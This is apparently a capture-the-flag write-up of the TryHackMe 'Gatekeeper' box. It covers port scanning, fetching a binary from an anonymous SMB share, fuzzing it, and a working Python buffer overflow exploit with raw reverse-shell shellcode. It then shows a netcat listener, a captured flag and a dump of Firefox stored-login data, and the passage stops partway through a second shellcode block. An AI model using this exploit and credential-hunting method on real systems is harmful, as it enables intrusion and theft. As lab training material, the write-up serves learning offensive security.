Links: [[TryHackMe Boxes]]

# Gatekeeper

### System IP: 10.10.35.92

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.35.92     | **TCP**: 135,139,445,3389,31337,49152-49155,49161,49165 

**Nmap Scan Results:**

```
# Nmap 7.91 scan initiated Thu Mar  4 18:36:31 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/ttl0/autorecon/autorecon/results/10.10.35.92/scans/_full_tcp_nmap.txt -oX /home/ttl0/autorecon/autorecon/results/10.10.35.92/scans/xml/_full_tcp_nmap.xml 10.10.35.92
Nmap scan report for 10.10.35.92
Host is up, received user-set (0.092s latency).
Scanned at 2021-03-04 18:36:31 EST for 727s
Not shown: 65524 closed ports
Reason: 65524 resets
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-03-03T23:33:05
| Not valid after:  2021-09-02T23:33:05
| MD5:   857e f003 7c30 4b51 6115 2764 a0e9 5876
| SHA-1: ab74 7ecf d482 52c6 ca54 de38 b27a 89d3 f660 7c41
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQcWqZ1dgpfblNQ6CX3Gfd9jANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpnYXRla2VlcGVyMB4XDTIxMDMwMzIzMzMwNVoXDTIxMDkwMjIz
| MzMwNVowFTETMBEGA1UEAxMKZ2F0ZWtlZXBlcjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAIwzrLtWfuxev4T7UipP2+WdR4vpEky6VVcrWn1FjC2qy3Rs
| fxJlrMpvQZ1oK1MuZUNtAJJ4fuu2r0KlTlRBoNifwMBkHC7YpmU+JAVp4n2ZA2ey
| uhVeTRYc6v9PLcCvSCxPUaa9srvowSSGgJzFnmTlr0PqhAd0IXlwFtZGZ8eb2P8A
| rQOy64sQGDi5bFeZTkZe1YExb/t60wsAHoT6Lj298f478SINdiQGVrMSy/Ma6TEx
| RYGY+29wrQ0VoAIyx64Stq9/MVedWbQp4y9oVTuX5K4/wwbtckCIa+490SjZwrsR
| iy8O6RefWBMVUl7p9GrmfXsGNx9PDCilxG9PTn0CAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQB9IPYQ
| m4M+A+Ol6ahuKBUYyU7NxHFpEk7fopp/e9joidHuY9uJcqe6faWoOXFNTrT2Yt5S
| Cr9okSJoimVrDgIA8f/ddVPVsBBoZ3ymaOfJrn8fewYqdf6GTD6saWPBDfhvXsZb
| 76fU/NH6IKBQxBL4Vtae5yfsxVo8EzaV47DIqHru024k0Xn0WO1aIK6rR711imJH
| p9Arv3Jiy6Mw2hSiDVIk1VrZ/5U2fbs219ghFwSs9jlCOCsiEdXrgy8Pu/NVAGuP
| bwJ61K6gE6y2zH8Bp5zCISPxcgHY6tiXjTha0TiZtsty8lkduoPxQs18qrcHp/kb
| OeRsQPCrIPFYUs/A
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-04T23:48:47+00:00; +10s from scanner time.
31337/tcp open  Elite?             syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HELP4STOMP: 
|     Hello HELP!!!
|     Hello !!!
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Hello: 
|     Hello EHLO
|   Help: 
|     Hello HELP
|   Kerberos, firebird: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   Memcache: 
|     Hello stats
|   NessusTPv10: 
|     Hello < NTP/1.0 >!!!
|   NessusTPv11: 
|     Hello < NTP/1.1 >!!!
|   NessusTPv12: 
|     Hello < NTP/1.2 >!!!
|   OfficeScan: 
|     Hello GET /?CAVIT HTTP/1.1
|     Hello
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: 
|     Hello
|   Socks5: 
|     Hello 
|     Hello google.com!!!
|     Hello
|   SqueezeCenter_CLI: 
|     Hello serverstatus
|   Verifier: 
|     Hello Subscribe!!!
|   VerifierAdvanced: 
|     Hello Query!!!
|   WWWOFFLEctrlstat: 
|     Hello WWWOFFLE STATUS
|   ajp: 
|     Hello 
|     4!!!
|   hp-pjl: 
|     Hello 
|     %-12345X@PJL INFO ID
|     Hello 
|     %-12345X
|   pervasive-btrieve: 
|     Hello <!!!
|     Hello 
|_    UR!!!
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=9%D=3/4%Time=60416FBC%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(
SF:SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20V
SF:ia:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@nm
SF:>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:\
SF:x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forwa
SF:rds:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:\
SF:x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x2
SF:0\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTTP
SF:Options,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")
SF:%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\r
SF:!!!\n")%r(Hello,F,"Hello\x20EHLO\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\
SF:n")%r(SSLSessionReq,C,"Hello\x20\x16\x03!!!\n")%r(TerminalServerCookie,
SF:B,"Hello\x20\x03!!!\n")%r(TLSSessionReq,C,"Hello\x20\x16\x03!!!\n")%r(S
SF:SLv23SessionReq,F,"Hello\x20\x80\x9e\x01\x03\x01!!!\n")%r(Kerberos,A,"H
SF:ello\x20!!!\n")%r(FourOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2
SF:C/Tri%6Eity\.txt%2ebak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDStrin
SF:g,12,"Hello\x20\x01default!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!
SF:\nHello\x20\x01!!!\n")%r(NessusTPv12,15,"Hello\x20<\x20NTP/1\.2\x20>!!!
SF:\n")%r(NessusTPv11,15,"Hello\x20<\x20NTP/1\.1\x20>!!!\n")%r(NessusTPv10
SF:,15,"Hello\x20<\x20NTP/1\.0\x20>!!!\n")%r(WWWOFFLEctrlstat,1A,"Hello\x2
SF:0WWWOFFLE\x20STATUS\r!!!\n")%r(Verifier,13,"Hello\x20Subscribe!!!\n")%r
SF:(VerifierAdvanced,F,"Hello\x20Query!!!\n")%r(Socks5,2B,"Hello\x20\x05\x
SF:04!!!\nHello\x20google\.com!!!\nHello\x20\r!!!\n")%r(OfficeScan,2A,"Hel
SF:lo\x20GET\x20/\?CAVIT\x20HTTP/1\.1\r!!!\nHello\x20\r!!!\n")%r(HELP4STOM
SF:P,18,"Hello\x20HELP!!!\nHello\x20!!!\n")%r(Memcache,10,"Hello\x20stats\
SF:r!!!\n")%r(firebird,A,"Hello\x20!!!\n")%r(pervasive-btrieve,1C,"Hello\x
SF:20<!!!\nHello\x20\x04\xa0\xbeS\x03UR!!!\n")%r(ajp,C,"Hello\x20\x124!!!\
SF:n")%r(hp-pjl,34,"Hello\x20\x1b%-12345X@PJL\x20INFO\x20ID\r!!!\nHello\x2
SF:0\x1b%-12345X\r!!!\n")%r(SqueezeCenter_CLI,17,"Hello\x20serverstatus\r!
SF:!!\n");
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/4%OT=135%CT=1%CU=36756%PV=Y%DS=2%DC=T%G=Y%TM=604171D
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M5
OS:06NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Uptime guess: 0.012 days (since Thu Mar  4 18:31:04 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m09s, deviation: 2h30m00s, median: 8s
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:98:74:e0:ae:b9 (unknown)
| Names:
|   GATEKEEPER<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   GATEKEEPER<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 98 74 e0 ae b9 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25398/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38911/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48292/udp): CLEAN (Timeout)
|   Check 4 (port 28635/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-04T18:48:41-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-04T23:48:41
|_  start_date: 2021-03-04T23:32:50

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   92.83 ms 10.9.0.1
2   92.87 ms 10.10.35.92

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  4 18:48:38 2021 -- 1 IP address (1 host up) scanned in 727.85 seconds

```

TCP 31337 looks suspicious, we open a TCP port to 31337

```
nc 10.10.35.92 31337
aaa
Hello aaa!!!

```

Likely a buffer overflow vulnerable application. Let's see if we can find the service running this application.

With nmap smb-ls script we find that there's an anonymous smb share that has gatekeeper.exe that is most likely the vulnerable app. 
```
| smb-ls: Volume \\10.10.35.92\Users
| SIZE   TIME                 FILENAME
| <DIR>  2009-07-14T03:20:08  .
| <DIR>  2009-07-14T03:20:08  ..
| <DIR>  2020-05-15T01:57:06  Share
| 13312  2020-05-15T01:19:17  Share\gatekeeper.exe

```

We download it using smbmap
```
└─$ smbmap -R Users -H 10.10.35.92 -u guest -p "" -P 445 -A gatekeeper.exe 
[+] IP: 10.10.35.92:445        Name: 10.10.35.92                                     
[+] Starting search for files matching 'gatekeeper.exe' on share Users.
[+] Match found! Downloading: Users\Share\gatekeeper.exe

```

We transfer the file to a windows 7 32 bit VM that has ImmunityDebugger to try and see if it contains an exploitable overflow:

```
┌──(ttl0㉿kali)-[~/tryhackme/gatekeeper]
└─$ ls
gatekeeper.exe
┌──(ttl0㉿kali)-[~/tryhackme/gatekeeper]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

On windows machine:
```
C:\Users\~\Desktop\vulnerable>certutil -urlcache -split -f http://10.0.1.40/gate
keeper.exe gatekeeper.exe
****  Online  ****
  0000  ...
  3400
CertUtil: -URLCache command completed successfully.
```

When loading on ImmunityDebugger we get the following error:

![](20210304190929.png)

A bit of research shows that Visual Studio is not downloaded and is needed as a dependency. I went and downloaded it on my Windows Buffer Overflow machine and i'm able to start the application. A quick scan on that machine shows that the 31337 TCP port is open:
```
nmap 10.0.1.100 -p 31337
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 19:19 EST
Nmap scan report for 10.0.1.100
Host is up (0.00027s latency).

PORT      STATE SERVICE
31337/tcp open  Elite

```

An ncat shows the same behavior than on the vulnerable server:
```
nc 10.0.1.100 31337
aaa
Hello aaa!!!

```

I wrote the following fuzzer to test quickly if we can crash the application:

```python
import socket, time, sys

ip = "10.0.1.100"
port = 31337
timeout = 3 

buffer = []
counter = 0 
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        print("Fuzzing with %s bytes" % len(string))
        s.send(string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)

```

We succeed creating an overflow:
```
python2 fuzzer.py 
Fuzzing with 0 bytes
Fuzzing with 100 bytes
Fuzzing with 200 bytes
^CCould not connect to 10.0.1.100:31337

```

**Initial Shell Vulnerability Exploited:**
We start a netcat listener:
```
┌──(ttl0㉿kali)-[~/tryhackme/gatekeeper]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.9.0.140] from (UNKNOWN) [10.10.35.92] 49208
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


```

We run the exploit we created for the vulnerable application running on port 31337. (See Proof of Concept Code section)
```
└─$ ./exploit.py
Sending evil buffer...
Done!

```

We are able to get the user flag.
```
C:\Users\natbat\Desktop>type user.txt.txt 
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```

**Vulnerability Explanation:**
A stack buffer overflow vulnerability exist in the way gatekeeper.exe reads and writes network data. By overflowing the input, we are able to take control of the EIP register and inject vulnerable code into the memory of the application.

**Vulnerability Fix:**
Patch the vulnerable code in gatekeeper.exe by using secure programming practices for handling buffers.

**Severity:**
Critical

**Proof of Concept Code Here:**
```python
#!/usr/bin/env python2.7
import socket

ip = "10.10.35.92"
port = 31337

offset = 146 
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
postfix = ""
buf =  b""
buf += b"\xbf\xa2\xe1\xcf\x19\xdb\xce\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x7b\x0e\x03\xd9\xef\x2d"
buf += b"\xec\xe1\x18\x33\x0f\x19\xd9\x54\x99\xfc\xe8\x54\xfd"
buf += b"\x75\x5a\x65\x75\xdb\x57\x0e\xdb\xcf\xec\x62\xf4\xe0"
buf += b"\x45\xc8\x22\xcf\x56\x61\x16\x4e\xd5\x78\x4b\xb0\xe4"
buf += b"\xb2\x9e\xb1\x21\xae\x53\xe3\xfa\xa4\xc6\x13\x8e\xf1"
buf += b"\xda\x98\xdc\x14\x5b\x7d\x94\x17\x4a\xd0\xae\x41\x4c"
buf += b"\xd3\x63\xfa\xc5\xcb\x60\xc7\x9c\x60\x52\xb3\x1e\xa0"
buf += b"\xaa\x3c\x8c\x8d\x02\xcf\xcc\xca\xa5\x30\xbb\x22\xd6"
buf += b"\xcd\xbc\xf1\xa4\x09\x48\xe1\x0f\xd9\xea\xcd\xae\x0e"
buf += b"\x6c\x86\xbd\xfb\xfa\xc0\xa1\xfa\x2f\x7b\xdd\x77\xce"
buf += b"\xab\x57\xc3\xf5\x6f\x33\x97\x94\x36\x99\x76\xa8\x28"
buf += b"\x42\x26\x0c\x23\x6f\x33\x3d\x6e\xf8\xf0\x0c\x90\xf8"
buf += b"\x9e\x07\xe3\xca\x01\xbc\x6b\x67\xc9\x1a\x6c\x88\xe0"
buf += b"\xdb\xe2\x77\x0b\x1c\x2b\xbc\x5f\x4c\x43\x15\xe0\x07"
buf += b"\x93\x9a\x35\x87\xc3\x34\xe6\x68\xb3\xf4\x56\x01\xd9"
buf += b"\xfa\x89\x31\xe2\xd0\xa1\xd8\x19\xb3\xc7\x15\x21\xcf"
buf += b"\xb0\x27\x21\xca\x79\xa1\xc7\xbe\x69\xe7\x50\x57\x13"
buf += b"\xa2\x2a\xc6\xdc\x78\x57\xc8\x57\x8f\xa8\x87\x9f\xfa"
buf += b"\xba\x70\x50\xb1\xe0\xd7\x6f\x6f\x8c\xb4\xe2\xf4\x4c"
buf += b"\xb2\x1e\xa3\x1b\x93\xd1\xba\xc9\x09\x4b\x15\xef\xd3"
buf += b"\x0d\x5e\xab\x0f\xee\x61\x32\xdd\x4a\x46\x24\x1b\x52"
buf += b"\xc2\x10\xf3\x05\x9c\xce\xb5\xff\x6e\xb8\x6f\x53\x39"
buf += b"\x2c\xe9\x9f\xfa\x2a\xf6\xf5\x8c\xd2\x47\xa0\xc8\xed"
buf += b"\x68\x24\xdd\x96\x94\xd4\x22\x4d\x1d\xf4\xc0\x47\x68"
buf += b"\x9d\x5c\x02\xd1\xc0\x5e\xf9\x16\xfd\xdc\x0b\xe7\xfa"
buf += b"\xfd\x7e\xe2\x47\xba\x93\x9e\xd8\x2f\x93\x0d\xd8\x65"

buffer = overflow + retn + padding + buf + postfix


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")

```

**Local.txt Proof Screenshot**

![](20210306121337.png)

**Local.txt Contents**
```
C:\Users\natbat\Desktop>Hostname && echo %username% && type user.txt.txt && ipconfig /all
Hostname && echo %username% && type user.txt.txt && ipconfig /all
gatekeeper
natbat 
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
Windows IP Configuration

   Host Name . . . . . . . . . . . . : gatekeeper
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.compute.internal

Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-8B-CE-41-EA-93
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b19d:4b29:5ccb:6917%17(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.35.92(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, March 06, 2021 12:00:07 PM
   Lease Expires . . . . . . . . . . : Saturday, March 06, 2021 1:00:07 PM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 285663925
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-2E-56-91-00-0C-29-C1-C1-82
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Users\natbat\Desktop>

```

#### Privilege Escalation

From looking in the users directory, we can see that Firefox is installed (Firefox.lnk):
```
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

03/04/2021  10:10 PM    <DIR>          .
03/04/2021  10:10 PM    <DIR>          ..
03/04/2021  09:13 PM    <DIR>          AppData
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
03/04/2021  09:12 PM            12,674 powerless.bat
05/14/2020  08:43 PM               140 user.txt.txt
              10 File(s)      4,090,962 bytes
               3 Dir(s)  15,786,434,560 bytes free

```

We check the profiles to see if there's anything interesting. There seems to be some encrypted logins found in one of the profiles:
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

05/14/2020  09:45 PM    <DIR>          .
05/14/2020  09:45 PM    <DIR>          ..
05/14/2020  09:30 PM                24 addons.json
05/14/2020  09:23 PM             1,952 addonStartup.json.lz4
05/14/2020  09:45 PM                 0 AlternateServices.txt
05/14/2020  09:30 PM    <DIR>          bookmarkbackups
05/14/2020  09:24 PM               216 broadcast-listeners.json
04/21/2020  11:47 PM           229,376 cert9.db
04/21/2020  04:00 PM               220 compatibility.ini
04/21/2020  04:00 PM               939 containers.json
04/21/2020  04:00 PM           229,376 content-prefs.sqlite
05/14/2020  09:45 PM           524,288 cookies.sqlite
05/14/2020  09:24 PM    <DIR>          crashes
05/14/2020  09:45 PM    <DIR>          datareporting
04/21/2020  04:00 PM             1,111 extension-preferences.json
04/21/2020  04:00 PM    <DIR>          extensions
05/14/2020  09:34 PM            39,565 extensions.json
05/14/2020  09:45 PM         5,242,880 favicons.sqlite
05/14/2020  09:39 PM           196,608 formhistory.sqlite
04/21/2020  09:50 PM    <DIR>          gmp-gmpopenh264
04/21/2020  09:50 PM    <DIR>          gmp-widevinecdm
04/21/2020  04:00 PM               540 handlers.json
04/21/2020  04:02 PM           294,912 key4.db
05/14/2020  09:43 PM               600 logins.json
04/21/2020  04:00 PM    <DIR>          minidumps
05/14/2020  09:23 PM                 0 parent.lock
05/14/2020  09:25 PM            98,304 permissions.sqlite
04/21/2020  04:00 PM               506 pkcs11.txt
05/14/2020  09:45 PM         5,242,880 places.sqlite
05/14/2020  09:45 PM            11,096 prefs.js
05/14/2020  09:45 PM            65,536 protections.sqlite
05/14/2020  09:45 PM    <DIR>          saved-telemetry-pings
05/14/2020  09:23 PM             2,715 search.json.mozlz4
05/14/2020  09:45 PM                 0 SecurityPreloadState.txt
04/21/2020  09:50 PM    <DIR>          security_state
05/14/2020  09:45 PM               288 sessionCheckpoints.json
05/14/2020  09:45 PM    <DIR>          sessionstore-backups
05/14/2020  09:45 PM            12,889 sessionstore.jsonlz4
04/21/2020  04:00 PM                18 shield-preference-experiments.json
05/14/2020  09:45 PM             1,357 SiteSecurityServiceState.txt
04/21/2020  04:00 PM    <DIR>          storage
05/14/2020  09:45 PM             4,096 storage.sqlite
04/21/2020  04:00 PM                50 times.json
05/14/2020  09:45 PM                 0 TRRBlacklist.txt
04/21/2020  04:00 PM    <DIR>          weave
04/21/2020  04:02 PM            98,304 webappsstore.sqlite
05/14/2020  09:45 PM               140 xulstore.json
              33 File(s)     12,300,786 bytes
              14 Dir(s)  15,886,839,808 bytes free

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>type logins.json
type logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}

```


We modify our exploit code to get a more stable shell using meterpreter so we can download easily the Profiles folder. We modify the buf variable with:
```
buf =  b""
buf += b"\xdb\xc3\xd9\x74\x24\xf4\x5e\xbf\x27\x38\xb5\x2e\x31"
buf += b"\xc9\xb1\x59\x31\x7e\x19\x03\x7e\x19\x83\xee\xfc\xc5"
buf += b"\xcd\x49\xc6\x86\x2e\xb2\x17\xf8\xa7\x57\x26\x2a\xd3"
buf += b"\x1c\x1b\xfa\x97\x71\x90\x71\xf5\x61\xa7\x32\xb0\xaf"
buf += b"\x3c\x4e\x6d\x81\xbd\x9f\xad\x4d\x7d\xbe\x51\x8c\x52"
buf += b"\x60\x6b\x5f\xa7\x61\xac\x29\xcd\x8e\x60\xfd\xa6\x02"
buf += b"\x95\x8a\xfb\x9e\x94\x5c\x70\x9e\xee\xd9\x47\x6a\x43"
buf += b"\xe3\x97\x19\x03\xc3\x9c\x55\xac\x02\x70\x35\x49\xcd"
buf += b"\x02\x89\x60\x31\xa3\x7a\xb6\x46\x35\xaa\x86\x98\xf7"
buf += b"\x9d\xe4\xb4\xf9\xe6\xcf\x24\x8c\x1c\x2c\xd8\x97\xe7"
buf += b"\x4e\x06\x1d\xf7\xe9\xcd\x85\xd3\x08\x01\x53\x90\x07"
buf += b"\xee\x17\xfe\x0b\xf1\xf4\x75\x37\x7a\xfb\x59\xb1\x38"
buf += b"\xd8\x7d\x99\x9b\x41\x24\x47\x4d\x7d\x36\x2f\x32\xdb"
buf += b"\x3d\xc2\x25\x5b\xbe\x1c\x4a\x01\x28\xd0\x87\xba\xa8"
buf += b"\x7e\x9f\xc9\x9a\x21\x0b\x46\x96\xaa\x95\x91\xaf\xbd"
